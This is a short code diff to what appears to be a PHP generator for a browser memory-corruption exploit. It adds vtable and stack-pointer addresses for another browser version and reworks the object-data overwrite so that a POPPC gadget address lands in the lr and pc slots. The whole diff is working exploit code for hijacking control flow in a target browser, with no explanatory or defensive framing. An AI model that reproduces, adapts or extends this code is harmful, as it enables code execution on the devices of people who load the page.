@@ -28,6 +28,12 @@ if(($browserver & 0x80) == 0)
 			$VTABLEPTR = 0x08c92018;
 			$STACKPTR_ADR = 0x08cb3018;
 		}
+
+		if(($browserver & 0xf) <= 0x2)
+		{
+			$VTABLEPTR = 0x08c4c018;
+			$STACKPTR_ADR = 0x08c6d018;
+		}
 	}
 	else
 	{
@@ -56,8 +62,8 @@ for($i=0; $i<0x7c; $i+=4)
 	else
 	{
 		if($loopcnt==0)$OBJECTDATA_OVERWRITE .= genu32_unicode($STACKPTR_ADR);//stack ptr
-		if($loopcnt==1)$OBJECTDATA_OVERWRITE .= genu32_unicode($VTABLEPTR);//lr / vtableptr when this overwrites object+0
-		if($loopcnt==2)$OBJECTDATA_OVERWRITE .= genu32_unicode($POPPC);
+		if($loopcnt==1)$OBJECTDATA_OVERWRITE .= genu32_unicode($POPPC);//lr, and in some cases pc.
+		if($loopcnt==2)$OBJECTDATA_OVERWRITE .= genu32_unicode($POPPC);//pc
 
 		$loopcnt++;
 		if($loopcnt > 2)$loopcnt = 0;
